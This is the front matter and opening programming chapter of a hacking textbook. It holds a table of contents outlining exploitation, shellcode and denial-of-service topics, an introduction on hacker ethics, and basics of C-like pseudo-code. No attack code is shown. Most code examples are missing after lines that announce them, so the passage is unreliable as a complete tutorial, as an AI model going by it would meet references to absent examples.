or by any information storage or retrieval system, without the prior\nwritten permission of the copyright owner and the publisher.\nProduction Editors: Christina Samuell and Megan Dunchak\nFor information on book distributors or translations, please contact No Starch Press, Inc. directly:\n555 De Haro Street, Suite 250, San Francisco, CA 94107\nphone: 415.863.9900; fax: 415.863.9950; info@nostarch.com; www.nostarch.com\nHacking : the art of exploitation / Jon Erickson. -- 2nd ed.\n1. Computer security.  2. Computer hackers.  3. Computer networks--Security measures.  I. Title.\nNo Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and\ncompany names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark\nsymbol with every occurrence of a trademarked name, we are using the names only in an editorial fashion and to the\nbenefit of the trademark owner, with no intention of infringement of the trademark.\nThe information in this book is distributed on an \u201cAs Is\u201d basis, without warranty. While every precaution has been\ntaken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any liability to any\nperson or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the\nPrinted on recycled paper in the United States of America\nPreface ......................................................................................................................... xi\nAcknowledgments ......................................................................................................... xii\nIntroduction .......................................................................................................1\nProgramming.....................................................................................................5\nExploitation ...................................................................................................115\nNetworking ...................................................................................................195\nShellcode ......................................................................................................281\nCountermeasures............................................................................................319\nCryptology ....................................................................................................393\nConclusion ....................................................................................................451\nIndex .........................................................................................................................455\nWhat Is Programming? ................................................................................. 6\nPseudo-code ................................................................................................ 7\nControl Structures ......................................................................................... 8\nIf-Then-Else...................................................................................... 8\nWhile/Until Loops ........................................................................... 9\nFor Loops ..................................................................................... 10\nMore Fundamental Programming Concepts ................................................... 11\nVariables ..................................................................................... 11\nArithmetic Operators ..................................................................... 12\nComparison Operators .................................................................. 14\nFunctions...................................................................................... 16\nGetting Your Hands Dirty ............................................................................ 19\nThe Bigger Picture ......................................................................... 20\nThe x86 Processor......................................................................... 23\nAssembly Language....................................................................... 25\nBack to Basics............................................................................................ 37\nStrings ......................................................................................... 38\nSigned, Unsigned, Long, and Short ................................................. 41\nPointers........................................................................................ 43\nFormat Strings............................................................................... 48\nTypecasting .................................................................................. 51\nCommand-Line Arguments .............................................................. 58\nVariable Scoping .......................................................................... 62\nMemory Segmentation ................................................................................ 69\nMemory Segments in C.................................................................. 75\nUsing the Heap............................................................................. 77\nError-Checked malloc()................................................................... 80\nBuilding on Basics ...................................................................................... 81\nFile Access ................................................................................... 81\nFile Permissions............................................................................. 87\nUser IDs ....................................................................................... 88\nStructs.......................................................................................... 96\nFunction Pointers ......................................................................... 100\nPseudo-random Numbers ............................................................. 101\nA Game of Chance ..................................................................... 102\nGeneralized Exploit Techniques ................................................................. 118\nBuffer Overflows ...................................................................................... 119\nStack-Based Buffer Overflow Vulnerabilities .................................... 122\nExperimenting with BASH.......................................................................... 133\nUsing the Environment.................................................................. 142\nOverflows in Other Segments .................................................................... 150\nA Basic Heap-Based Overflow ...................................................... 150\nOverflowing Function Pointers....................................................... 156\nFormat Strings.......................................................................................... 167\nFormat Parameters....................................................................... 167\nThe Format String Vulnerability...................................................... 170\nReading from Arbitrary Memory Addresses .................................... 172\nWriting to Arbitrary Memory Addresses......................................... 173\nDirect Parameter Access............................................................... 180\nUsing Short Writes ...................................................................... 182\nDetours with .dtors....................................................................... 184\nAnother notesearch Vulnerability ................................................... 189\nOverwriting the Global Offset Table .............................................. 190\nOSI Model .............................................................................................. 196\nSockets ................................................................................................... 198\nSocket Functions.......................................................................... 199\nSocket Addresses ........................................................................ 200\nNetwork Byte Order .................................................................... 202\nInternet Address Conversion ......................................................... 203\nA Simple Server Example ............................................................. 203\nA Web Client Example ................................................................ 207\nA Tinyweb Server........................................................................ 213\nPeeling Back the Lower Layers.................................................................... 217\nData-Link Layer............................................................................ 218\nNetwork Layer ............................................................................ 220\nTransport Layer ........................................................................... 221\nNetwork Sniffing ...................................................................................... 224\nRaw Socket Sniffer....................................................................... 226\nlibpcap Sniffer ............................................................................ 228\nDecoding the Layers .................................................................... 230\nActive Sniffing............................................................................. 239\nDenial of Service...................................................................................... 251\nSYN Flooding ............................................................................. 252\nThe Ping of Death........................................................................ 256\nTeardrop.................................................................................... 256\nPing Flooding ............................................................................. 257\nAmplification Attacks ................................................................... 257\nDistributed DoS Flooding.............................................................. 258\nTCP/IP Hijacking...................................................................................... 258\nRST Hijacking ............................................................................. 259\nContinued Hijacking.................................................................... 263\nPort Scanning .......................................................................................... 264\nStealth SYN Scan ........................................................................ 264\nFIN, X-mas, and Null Scans .......................................................... 264\nSpoofing Decoys......................................................................... 265\nIdle Scanning.............................................................................. 265\nProactive Defense (shroud)............................................................ 267\nReach Out and Hack Someone .................................................................. 272\nAnalysis with GDB....................................................................... 273\nAlmost Only Counts with Hand Grenades ...................................... 275\nPort-Binding Shellcode ................................................................. 278\nAssembly vs. C ........................................................................................ 282\nLinux System Calls in Assembly ..................................................... 284\nThe Path to Shellcode................................................................................ 286\nAssembly Instructions Using the Stack ............................................ 287\nInvestigating with GDB................................................................. 289\nRemoving Null Bytes .................................................................... 290\nShell-Spawning Shellcode.......................................................................... 295\nA Matter of Privilege.................................................................... 299\nAnd Smaller Still.......................................................................... 302\nPort-Binding Shellcode .............................................................................. 303\nDuplicating Standard File Descriptors............................................. 307\nBranching Control Structures......................................................... 309\nConnect-Back Shellcode ............................................................................ 314\nCountermeasures That Detect ..................................................................... 320\nSystem Daemons ...................................................................................... 321\nCrash Course in Signals............................................................... 322\nTinyweb Daemon ........................................................................ 324\nTools of the Trade..................................................................................... 328\ntinywebd Exploit Tool................................................................... 329\nLog Files.................................................................................................. 334\nBlend In with the Crowd............................................................... 334\nOverlooking the Obvious .......................................................................... 336\nOne Step at a Time ..................................................................... 336\nPutting Things Back Together Again............................................... 340\nChild Laborers ............................................................................ 346\nAdvanced Camouflage ............................................................................. 348\nSpoofing the Logged IP Address.................................................... 348\nLogless Exploitation ..................................................................... 352\nThe Whole Infrastructure ........................................................................... 354\nSocket Reuse .............................................................................. 355\nPayload Smuggling .................................................................................. 359\nString Encoding .......................................................................... 359\nHow to Hide a Sled..................................................................... 362\nBuffer Restrictions ..................................................................................... 363\nPolymorphic Printable ASCII Shellcode........................................... 366\nHardening Countermeasures...................................................................... 376\nNonexecutable Stack ................................................................................ 376\nret2libc ...................................................................................... 376\nReturning into system().................................................................. 377\nRandomized Stack Space .......................................................................... 379\nInvestigations with BASH and GDB ................................................ 380\nBouncing Off linux-gate ................................................................ 384\nApplied Knowledge ..................................................................... 388\nA First Attempt............................................................................. 388\nPlaying the Odds......................................................................... 390\nInformation Theory ................................................................................... 394\nUnconditional Security ................................................................. 394\nOne-Time Pads............................................................................ 395\nQuantum Key Distribution............................................................. 395\nComputational Security ................................................................ 396\nAlgorithmic Run Time ................................................................................ 397\nAsymptotic Notation .................................................................... 398\nSymmetric Encryption................................................................................ 398\nLov Grover\u2019s Quantum Search Algorithm........................................ 399\nAsymmetric Encryption.............................................................................. 400\nRSA ........................................................................................... 400\nPeter Shor\u2019s Quantum Factoring Algorithm ..................................... 404\nHybrid Ciphers ........................................................................................ 406\nMan-in-the-Middle Attacks ............................................................ 406\nDiffering SSH Protocol Host Fingerprints......................................... 410\nFuzzy Fingerprints ....................................................................... 413\nPassword Cracking................................................................................... 418\nDictionary Attacks ....................................................................... 419\nExhaustive Brute-Force Attacks....................................................... 422\nHash Lookup Table ...................................................................... 423\nPassword Probability Matrix ......................................................... 424\nWireless 802.11b Encryption.................................................................... 433\nWired Equivalent Privacy ............................................................. 434\nRC4 Stream Cipher ..................................................................... 435\nWEP Attacks............................................................................................ 436\nOffline Brute-Force Attacks............................................................ 436\nKeystream Reuse ......................................................................... 437\nIV-Based Decryption Dictionary Tables ........................................... 438\nIP Redirection.............................................................................. 438\nFluhrer, Mantin, and Shamir Attack ............................................... 439\nReferences............................................................................................... 452\nSources................................................................................................... 454\nThe goal of this book is to share the art of hacking\nis often difficult, since it requires both breadth and\ndepth of knowledge. Many hacking texts seem esoteric\nand confusing because of just a few gaps in this prerequisite education. This\nsecond edition of Hacking: The Art of Exploitation makes the world of hacking\nmore accessible by providing the complete picture\u2014from programming to\nmachine code to exploitation. In addition, this edition features a bootable\nLiveCD based on Ubuntu Linux that can be used in any computer with\nan x86 processor, without modifying the computer\u2019s existing OS. This CD\ncontains all the source code in the book and provides a development and\nexploitation environment you can use to follow along with the book\u2019s\nI would like to thank Bill Pollock and everyone else at\nNo Starch Press for making this book a possibility and\nallowing me to have so much creative control in the\nprocess. Also, I would like to thank my friends Seth Benson and Aaron Adams\nfor proofreading and editing, Jack Matheson for helping me with assembly,\nDr. Seidel for keeping me interested in the science of computer science, my\nparents for buying that first Commodore VIC-20, and the hacker community\nfor the innovation and creativity that produced the techniques explained in\nelectronic vandalism, espionage, dyed hair, and body\npiercings. Most people associate hacking with breaking\nthe law and assume that everyone who engages in hack-\ning activities is a criminal. Granted, there are people out\nthere who use hacking techniques to break the law, but hacking isn\u2019t really\nabout that. In fact, hacking is more about following the law than breaking it.\nThe essence of hacking is finding unintended or overlooked uses for the\nlaws and properties of a given situation and then applying them in new and\ninventive ways to solve a problem\u2014whatever it may be.\nThe following math problem illustrates the essence of hacking:\nUse each of the numbers 1, 3, 4, and 6 exactly once with any\nof the four basic math operations (addition, subtraction,\nmultiplication, and division) to total 24. Each number must be\nused once and only once, and you may define the order of\noperations; for example, 3 * (4 + 6) + 1 = 31 is valid, however\nThe rules for this problem are well defined and simple, yet the answer\neludes many. Like the solution to this problem (shown on the last page of\nthis book), hacked solutions follow the rules of the system, but they use those\nrules in counterintuitive ways. This gives hackers their edge, allowing them to\nsolve problems in ways unimaginable for those confined to conventional\nSince the infancy of computers, hackers have been creatively solving\nproblems. In the late 1950s, the MIT model railroad club was given a dona-\ntion of parts, mostly old telephone equipment. The club\u2019s members used this\nequipment to rig up a complex system that allowed multiple operators to con-\ntrol different parts of the track by dialing in to the appropriate sections. They\ncalled this new and inventive use of telephone equipment hacking; many\npeople consider this group to be the original hackers. The group moved on\nto programming on punch cards and ticker tape for early computers like the\nIBM 704 and the TX-0. While others were content with writing programs that\njust solved problems, the early hackers were obsessed with writing programs\nthat solved problems well. A new program that could achieve the same result\nas an existing one but used fewer punch cards was considered better, even\nthough it did the same thing. The key difference was how the program\nBeing able to reduce the number of punch cards needed for a program\nshowed an artistic mastery over the computer. A nicely crafted table can hold\na vase just as well as a milk crate can, but one sure looks a lot better than the\nother. Early hackers proved that technical problems can have artistic solu-\ntions, and they thereby transformed programming from a mere engineering\nLike many other forms of art, hacking was often misunderstood. The few\nwho got it formed an informal subculture that remained intensely focused\non learning and mastering their art. They believed that information should\nbe free and anything that stood in the way of that freedom should be circum-\nvented. Such obstructions included authority figures, the bureaucracy of\ncollege classes, and discrimination. In a sea of graduation-driven students,\nthis unofficial group of hackers defied conventional goals and instead pursued\nknowledge itself. This drive to continually learn and explore transcended\neven the conventional boundaries drawn by discrimination, evident in the\nMIT model railroad club\u2019s acceptance of 12-year-old Peter Deutsch when\nhe demonstrated his knowledge of the TX-0 and his desire to learn. Age,\nrace, gender, appearance, academic degrees, and social status were not\nprimary criteria for judging another\u2019s worth\u2014not because of a desire for\nequality, but because of a desire to advance the emerging art of hacking.\nThe original hackers found splendor and elegance in the conventionally\ndry sciences of math and electronics. They saw programming as a form of\nartistic expression and the computer as an instrument of that art. Their desire\nto dissect and understand wasn\u2019t intended to demystify artistic endeavors; it\nwas simply a way to achieve a greater appreciation of them. These knowledge-\ndriven values would eventually be called the Hacker Ethic: the appreciation\nof logic as an art form and the promotion of the free flow of information,\nsurmounting conventional boundaries and restrictions for the simple goal of\nbetter understanding the world. This is not a new cultural trend; the\nPythagoreans in ancient Greece had a similar ethic and subculture, despite\nnot owning computers. They saw beauty in mathematics and discovered many\ncore concepts in geometry. That thirst for knowledge and its beneficial by-\nproducts would continue on through history, from the Pythagoreans to Ada\nLovelace to Alan Turing to the hackers of the MIT model railroad club.\nModern hackers like Richard Stallman and Steve Wozniak have continued\nthe hacking legacy, bringing us modern operating systems, programming\nlanguages, personal computers, and many other technologies that we use\nHow does one distinguish between the good hackers who bring us the\nwonders of technological advancement and the evil hackers who steal our\ncredit card numbers? The term cracker was coined to distinguish evil hackers\nfrom the good ones. Journalists were told that crackers were supposed to be\nthe bad guys, while hackers were the good guys. Hackers stayed true to the\nHacker Ethic, while crackers were only interested in breaking the law and\nmaking a quick buck. Crackers were considered to be much less talented\nthan the elite hackers, as they simply made use of hacker-written tools and\nscripts without understanding how they worked. Cracker was meant to be the\ncatch-all label for anyone doing anything unscrupulous with a computer\u2014\npirating software, defacing websites, and worst of all, not understanding what\nthey were doing. But very few people use this term today.\nThe term\u2019s lack of popularity might be due to its confusing etymology\u2014\ncracker originally described those who crack software copyrights and reverse\nengineer copy-protection schemes. Its current unpopularity might simply\nresult from its two ambiguous new definitions: a group of people who engage\nin illegal activity with computers or people who are relatively unskilled hackers.\nFew technology journalists feel compelled to use terms that most of their\nreaders are unfamiliar with. In contrast, most people are aware of the mystery\nand skill associated with the term hacker, so for a journalist, the decision to\nuse the term hacker is easy. Similarly, the term script kiddie is sometimes used\nto refer to crackers, but it just doesn\u2019t have the same zing as the shadowy\nhacker. There are some who will still argue that there is a distinct line between\nhackers and crackers, but I believe that anyone who has the hacker spirit is a\nThe current laws restricting cryptography and cryptographic research\nfurther blur the line between hackers and crackers. In 2001, Professor Edward\nFelten and his research team from Princeton University were about to publish\na paper that discussed the weaknesses of various digital watermarking schemes.\nThis paper responded to a challenge issued by the Secure Digital Music\nInitiative (SDMI) in the SDMI Public Challenge, which encouraged the\npublic to attempt to break these watermarking schemes. Before Felten and\nhis team could publish the paper, though, they were threatened by both the\nSDMI Foundation and the Recording Industry Association of America (RIAA).\nThe Digital Millennium Copyright Act (DCMA) of 1998 makes it illegal to\ndiscuss or provide technology that might be used to bypass industry con-\nsumer controls. This same law was used against Dmitry Sklyarov, a Russian\ncomputer programmer and hacker. He had written software to circumvent\noverly simplistic encryption in Adobe software and presented his findings at a\nhacker convention in the United States. The FBI swooped in and arrested\nhim, leading to a lengthy legal battle. Under the law, the complexity of the\nindustry consumer controls doesn\u2019t matter\u2014it would be technically illegal to\nreverse engineer or even discuss Pig Latin if it were used as an industry con-\nsumer control. Who are the hackers and who are the crackers now? When\nlaws seem to interfere with free speech, do the good guys who speak their\nminds suddenly become bad? I believe that the spirit of the hacker transcends\ngovernmental laws, as opposed to being defined by them.\nThe sciences of nuclear physics and biochemistry can be used to kill,\nyet they also provide us with significant scientific advancement and modern\nmedicine. There\u2019s nothing good or bad about knowledge itself; morality lies\nin the application of knowledge. Even if we wanted to, we couldn\u2019t suppress\nthe knowledge of how to convert matter into energy or stop the continued\ntechnological progress of society. In the same way, the hacker spirit can\nnever be stopped, nor can it be easily categorized or dissected. Hackers will\nconstantly be pushing the limits of knowledge and acceptable behavior,\nPart of this drive results in an ultimately beneficial co-evolution of\nsecurity through competition between attacking hackers and defending\nhackers. Just as the speedy gazelle adapted from being chased by the cheetah,\nand the cheetah became even faster from chasing the gazelle, the competi-\ntion between hackers provides computer users with better and stronger\nsecurity, as well as more complex and sophisticated attack techniques. The\nintroduction and progression of intrusion detection systems (IDSs) is a prime\nexample of this co-evolutionary process. The defending hackers create IDSs\nto add to their arsenal, while the attacking hackers develop IDS-evasion\ntechniques, which are eventually compensated for in bigger and better IDS\nproducts. The net result of this interaction is positive, as it produces smarter\npeople, improved security, more stable software, inventive problem-solving\nThe intent of this book is to teach you about the true spirit of hacking.\nWe will look at various hacker techniques, from the past to the present,\ndissecting them to learn how and why they work. Included with this book is\na bootable LiveCD containing all the source code used herein as well as a\npreconfigured Linux environment. Exploration and innovation are critical\nto the art of hacking, so this CD will let you follow along and experiment on\nyour own. The only requirement is an x86 processor, which is used by all\nMicrosoft Windows machines and the newer Macintosh computers\u2014just\ninsert the CD and reboot. This alternate Linux environment will not disturb\nyour existing OS, so when you\u2019re done, just reboot again and remove the CD.\nThis way, you will gain a hands-on understanding and appreciation for hacking\nthat may inspire you to improve upon existing techniques or even to invent\nnew ones. Hopefully, this book will stimulate the curious hacker nature in you\nand prompt you to contribute to the art of hacking in some way, regardless of\nthose who exploit it. Even though these two groups of\nhackers have different end goals, both groups use similar\nof programming helps those who exploit, and an under-\nstanding of exploitation helps those who program, many\nhackers do both. There are interesting hacks found in both the techniques\nused to write elegant code and the techniques used to exploit programs.\nHacking is really just the act of finding a clever and counterintuitive\nThe hacks found in program exploits usually use the rules of the\ncomputer to bypass security in ways never intended. Programming hacks are\nsimilar in that they also use the rules of the computer in new and inventive\nways, but the final goal is efficiency or smaller source code, not necessarily a\nsecurity compromise. There are actually an infinite number of programs that\ncan be written to accomplish any given task, but most of these solutions are\nunnecessarily large, complex, and sloppy. The few solutions that remain\nare small, efficient, and neat. Programs that have these qualities are said to\nhave elegance, and the clever and inventive solutions that tend to lead to\nthis efficiency are called hacks. Hackers on both sides of programming\nappreciate both the beauty of elegant code and the ingenuity of clever hacks.\nIn the business world, more importance is placed on churning out func-\ntional code than on achieving clever hacks and elegance. Because of the\ntremendous exponential growth of computational power and memory,\nspending an extra five hours to create a slightly faster and more memory-\nefficient piece of code just doesn\u2019t make business sense when dealing with\nmodern computers that have gigahertz of processing cycles and gigabytes of\nmemory. While time and memory optimizations go without notice by all but\nthe most sophisticated of users, a new feature is marketable. When the\nbottom line is money, spending time on clever hacks for optimization just\nTrue appreciation of programming elegance is left for the hackers:\ncomputer hobbyists whose end goal isn\u2019t to make a profit but to squeeze\nevery possible bit of functionality out of their old Commodore 64s, exploit\nwriters who need to write tiny and amazing pieces of code to slip through\nnarrow security cracks, and anyone else who appreciates the pursuit and the\nchallenge of finding the best possible solution. These are the people who get\nexcited about programming and really appreciate the beauty of an elegant\npiece of code or the ingenuity of a clever hack. Since an understanding of\nprogramming is a prerequisite to understanding how programs can be\nexploited, programming is a natural starting point.\nProgramming is a very natural and intuitive concept. A program is nothing\nmore than a series of statements written in a specific language. Programs are\neverywhere, and even the technophobes of the world use programs every day.\nDriving directions, cooking recipes, football plays, and DNA are all types of\nprograms. A typical program for driving directions might look something\nStart out down Main Street headed east. Continue on Main Street until you see\na church on your right. If the street is blocked because of construction, turn\nright there at 15th Street, turn left on Pine Street, and then turn right on\n16th Street. Otherwise, you can just continue and make a right on 16th Street.\nContinue on 16th Street, and turn left onto Destination Road. Drive straight\ndown Destination Road for 5 miles, and then you'll see the house on the right.\nAnyone who knows English can understand and follow these driving\ndirections, since they\u2019re written in English. Granted, they\u2019re not eloquent,\nbut each instruction is clear and easy to understand, at least for someone\nBut a computer doesn\u2019t natively understand English; it only understands\nmachine language. To instruct a computer to do something, the instructions\nmust be written in its language. However, machine language is arcane and\ndifficult to work with\u2014it consists of raw bits and bytes, and it differs from\narchitecture to architecture. To write a program in machine language for an\nIntel x86 processor, you would have to figure out the value associated with\neach instruction, how each instruction interacts, and myriad low-level details.\nProgramming like this is painstaking and cumbersome, and it is certainly not\nWhat\u2019s needed to overcome the complication of writing machine language\nis a translator. An assembler is one form of machine-language translator\u2014it is\na program that translates assembly language into machine-readable code.\nAssembly language is less cryptic than machine language, since it uses names\nfor the different instructions and variables, instead of just using numbers.\nHowever, assembly language is still far from intuitive. The instruction names\nare very esoteric, and the language is architecture specific. Just as machine\nlanguage for Intel x86 processors is different from machine language for\nSparc processors, x86 assembly language is different from Sparc assembly\nlanguage. Any program written using assembly language for one processor\u2019s\narchitecture will not work on another processor\u2019s architecture. If a program\nis written in x86 assembly language, it must be rewritten to run on Sparc\narchitecture. In addition, in order to write an effective program in assembly\nlanguage, you must still know many low-level details of the processor archi-\nThese problems can be mitigated by yet another form of translator called\na compiler. A compiler converts a high-level language into machine language.\nHigh-level languages are much more intuitive than assembly language and\ncan be converted into many different types of machine language for differ-\nent processor architectures. This means that if a program is written in a high-\nlevel language, the program only needs to be written once; the same piece of\nprogram code can be compiled into machine language for various specific\narchitectures. C, C++, and Fortran are all examples of high-level languages.\nA program written in a high-level language is much more readable and\nEnglish-like than assembly language or machine language, but it still must\nfollow very strict rules about how the instructions are worded, or the com-\nProgrammers have yet another form of programming language called\npseudo-code. Pseudo-code is simply English arranged with a general structure\nsimilar to a high-level language. It isn\u2019t understood by compilers, assemblers,\nor any computers, but it is a useful way for a programmer to arrange instruc-\ntions. Pseudo-code isn\u2019t well defined; in fact, most people write pseudo-code\nslightly differently. It\u2019s sort of the nebulous missing link between English and\nhigh-level programming languages like C. Pseudo-code makes for an excel-\nlent introduction to common universal programming concepts.\nWithout control structures, a program would just be a series of instructions\nexecuted in sequential order. This is fine for very simple programs, but most\nprograms, like the driving directions example, aren\u2019t that simple. The driv-\ning directions included statements like, Continue on Main Street until you see a\nchurch on your right and If the street is blocked because of construction. . . . These\nstatements are known as control structures, and they change the flow of the\nprogram\u2019s execution from a simple sequential order to a more complex and\nIn the case of our driving directions, Main Street could be under construction.\nIf it is, a special set of instructions needs to address that situation. Otherwise,\nthe original set of instructions should be followed. These types of special cases\ncan be accounted for in a program with one of the most natural control\nstructures: the if-then-else structure. In general, it looks something like this:\nSet of instructions to execute if the condition is met;\nSet of instruction to execute if the condition is not met;\nFor this book, a C-like pseudo-code will be used, so every instruction will\nend with a semicolon, and the sets of instructions will be grouped with curly\nbraces and indentation. The if-then-else pseudo-code structure of the pre-\nceding driving directions might look something like this:\nEach instruction is on its own line, and the various sets of conditional\ninstructions are grouped between curly braces and indented for readability.\nIn C and many other programming languages, the then keyword is implied and\ntherefore left out, so it has also been omitted in the preceding pseudo-code.\nOf course, other languages require the then keyword in their syntax\u2014\nBASIC, Fortran, and even Pascal, for example. These types of syntactical\ndifferences in programming languages are only skin deep; the underlying\nstructure is still the same. Once a programmer understands the concepts\nthese languages are trying to convey, learning the various syntactical vari-\nations is fairly trivial. Since C will be used in the later sections, the pseudo-\ncode used in this book will follow a C-like syntax, but remember that\nAnother common rule of C-like syntax is when a set of instructions\nbounded by curly braces consists of just one instruction, the curly braces are\noptional. For the sake of readability, it\u2019s still a good idea to indent these\ninstructions, but it\u2019s not syntactically necessary. The driving directions from\nbefore can be rewritten following this rule to produce an equivalent piece of\nThis rule about sets of instructions holds true for all of the control\nstructures mentioned in this book, and the rule itself can be described in\nIf (there is only one instruction in a set of instructions)\nThe use of curly braces to group the instructions is optional;\nSince there must be a logical way to group these instructions;\nEven the description of a syntax itself can be thought of as a simple\nprogram. There are variations of if-then-else, such as select/case statements,\nbut the logic is still basically the same: If this happens do these things, otherwise\ndo these other things (which could consist of even more if-then statements).\nAnother elementary programming concept is the while control structure,\nwhich is a type of loop. A programmer will often want to execute a set of\ninstructions more than once. A program can accomplish this task through\nlooping, but it requires a set of conditions that tells it when to stop looping,\nlest it continue into infinity. A while loop says to execute the following set of\ninstructions in a loop while a condition is true. A simple program for a hungry\nThe set of two instructions following the while statement will be repeated\nwhile the mouse is still hungry. The amount of food the mouse finds each\ntime could range from a tiny crumb to an entire loaf of bread. Similarly, the\nnumber of times the set of instructions in the while statement is executed\nchanges depending on how much food the mouse finds.\nAnother variation on the while loop is an until loop, a syntax that is\navailable in the programming language Perl (C doesn\u2019t use this syntax). An\nuntil loop is simply a while loop with the conditional statement inverted. The\nLogically, any until-like statement can be converted into a while loop.\nThe driving directions from before contained the statement Continue on\nMain Street until you see a church on your right. This can easily be changed into a\nstandard while loop by simply inverting the condition.\nAnother looping control structure is the for loop. This is generally used when\na programmer wants to loop for a certain number of iterations. The driving\ndirection Drive straight down Destination Road for 5 miles could be converted to\nIn reality, a for loop is just a while loop with a counter. The same state-\nThe C-like pseudo-code syntax of a for loop makes this even more\nIn this case, the counter is called i, and the for statement is broken up\ninto three sections, separated by semicolons. The first section declares the\ncounter and sets it to its initial value, in this case 0. The second section is like\na while statement using the counter: While the counter meets this condition,\nkeep looping. The third and final section describes what action should be\ntaken on the counter during each iteration. In this case, i++ is a shorthand\nUsing all of the control structures, the driving directions from page 6\ncan be converted into a C-like pseudo-code that looks something like this:\nIn the following sections, more universal programming concepts will be\nintroduced. These concepts are used in many programming languages, with\na few syntactical differences. As I introduce these concepts, I will integrate\nthem into pseudo-code examples using C-like syntax. By the end, the pseudo-\nThe counter used in the for loop is actually a type of variable. A variable can\nsimply be thought of as an object that holds data that can be changed\u2014\nhence the name. There are also variables that don\u2019t change, which are aptly\ncalled constants. Returning to the driving example, the speed of the car would\nbe a variable, while the color of the car would be a constant. In pseudo-\ncode, variables are simple abstract concepts, but in C (and in many other\nlanguages), variables must be declared and given a type before they can be\nused. This is because a C program will eventually be compiled into an exe-\ncutable program. Like a cooking recipe that lists all the required ingredients\nbefore giving the instructions, variable declarations allow you to make prep-\narations before getting into the meat of the program. Ultimately, all variables\nare stored in memory somewhere, and their declarations allow the compiler\nto organize this memory more efficiently. In the end though, despite all of\nthe variable type declarations, everything is all just memory.\nIn C, each variable is given a type that describes the information that is\nmeant to be stored in that variable. Some of the most common types are int\n(integer values), float (decimal floating-point values), and char (single char-\nacter values). Variables are declared simply by using these keywords before\nThe variables a and b are now defined as integers, k can accept floating-\npoint values (such as 3.14), and z is expected to hold a character value, like A\nor w. Variables can be assigned values when they are declared or anytime\nAfter the following instructions are executed, the variable a will contain\nthe value of 13, k will contain the number 3.14, z will contain the character w,\nand b will contain the value 18, since 13 plus 5 equals 18. Variables are simply\na way to remember values; however, with C, you must first declare each\nThe statement b = a + 7 is an example of a very simple arithmetic operator.\nIn C, the following symbols are used for various arithmetic operations.\nThe first four operations should look familiar. Modulo reduction may\nseem like a new concept, but it\u2019s really just taking the remainder after divi-\nsion. If a is 13, then 13 divided by 5 equals 2, with a remainder of 3, which\nmeans that a % 5 = 3. Also, since the variables a and b are integers, the\nstatement b = a / 5 will result in the value of 2 being stored in b, since that\u2019s\nthe integer portion of it. Floating-point variables must be used to retain the\nTo get a program to use these concepts, you must speak its language. The\nC language also provides several forms of shorthand for these arithmetic oper-\nations. One of these was mentioned earlier and is used commonly in for loops.\nThese shorthand expressions can be combined with other arithmetic\noperations to produce more complex expressions. This is where the differ-\nence between i++ and ++i becomes apparent. The first expression means\nIncrement the value of i by 1 after evaluating the arithmetic operation, while the\nsecond expression means Increment the value of i by 1 before evaluating the\narithmetic operation. The following example will help clarify.\nAt the end of this set of instructions, b will contain 30 and a will contain 6,\nsince the shorthand of b = a++ * 6; is equivalent to the following statements:\nHowever, if the instruction b = ++a * 6; is used, the order of the addition\nto a changes, resulting in the following equivalent instructions:\nSince the order has changed, in this case b will contain 36, and a will still\nQuite often in programs, variables need to be modified in place. For\nexample, you might need to add an arbitrary value like 12 to a variable, and\nstore the result right back in that variable (for example, i = i + 12). This\nhappens commonly enough that shorthand also exists for it.\nVariables are frequently used in the conditional statements of the previously\nexplained control structures. These conditional statements are based on some\nsort of comparison. In C, these comparison operators use a shorthand syntax\nthat is fairly common across many programming languages.\nMost of these operators are self-explanatory; however, notice that the\nshorthand for equal to uses double equal signs. This is an important distinc-\ntion, since the double equal sign is used to test equivalence, while the single\nequal sign is used to assign a value to a variable. The statement a = 7 means\nPut the value 7 in the variable a, while a == 7 means Check to see whether the variable\na is equal to 7. (Some programming languages like Pascal actually use := for\nvariable assignment to eliminate visual confusion.) Also, notice that an\nexclamation point generally means not. This symbol can be used by itself to\nThese comparison operators can also be chained together using short-\nThe example statement consisting of the two smaller conditions joined\nwith OR logic will fire true if a is less than b, OR if a is less than c. Similarly,\nthe example statement consisting of two smaller comparisons joined with\nAND logic will fire true if a is less than b AND a is not less than c. These\nstatements should be grouped with parentheses and can contain many\nMany things can be boiled down to variables, comparison operators, and\ncontrol structures. Returning to the example of the mouse searching for food,\nhunger can be translated into a Boolean true/false variable. Naturally, 1\nHere\u2019s another shorthand used by programmers and hackers quite\noften. C doesn\u2019t really have any Boolean operators, so any nonzero value is\nconsidered true, and a statement is considered false if it contains 0. In fact,\nthe comparison operators will actually return a value of 1 if the comparison is\ntrue and a value of 0 if it is false. Checking to see whether the variable hungry\nis equal to 1 will return 1 if hungry equals 1 and 0 if hungry equals 0. Since the\nprogram only uses these two cases, the comparison operator can be dropped\nA smarter mouse program with more inputs demonstrates how compari-\nThis example assumes there are also variables that describe the presence\nof a cat and the location of the food, with a value of 1 for true and 0 for false.\nJust remember that any nonzero value is considered true, and the value of 0\nSometimes there will be a set of instructions the programmer knows he will\nneed several times. These instructions can be grouped into a smaller sub-\nprogram called a function. In other languages, functions are known as sub-\nroutines or procedures. For example, the action of turning a car actually\nconsists of many smaller instructions: Turn on the appropriate blinker, slow\ndown, check for oncoming traffic, turn the steering wheel in the appropriate\ndirection, and so on. The driving directions from the beginning of this chap-\nter require quite a few turns; however, listing every little instruction for every\nturn would be tedious (and less readable). You can pass variables as arguments\nto a function in order to modify the way the function operates. In this case,\nTurn the steering wheel back to the original position;\nThis function describes all the instructions needed to make a turn. When\na program that knows about this function needs to turn, it can just call this\nfunction. When the function is called, the instructions found within it are\nexecuted with the arguments passed to it; afterward, execution returns to\nwhere it was in the program, after the function call. Either left or right can\nbe passed into this function, which causes the function to turn in that\nBy default in C, functions can return a value to a caller. For those\nfamiliar with functions in mathematics, this makes perfect sense. Imagine a\nfunction that calculates the factorial of a number\u2014naturally, it returns the\nIn C, functions aren\u2019t labeled with a \u201cfunction\u201d keyword; instead, they\nare declared by the data type of the variable they are returning. This format\nlooks very similar to variable declaration. If a function is meant to return an\ninteger (perhaps a function that calculates the factorial of some number x),\nThis function is declared as an integer because it multiplies every value\nfrom 1 to x and returns the result, which is an integer. The return statement\nat the end of the function passes back the contents of the variable x and ends\nthe function. This factorial function can then be used like an integer variable\nin the main part of any program that knows about it.\nAt the end of this short program, the variable b will contain 120, since\nthe factorial function will be called with the argument of 5 and will return 120.\nAlso in C, the compiler must \u201cknow\u201d about functions before it can use\nthem. 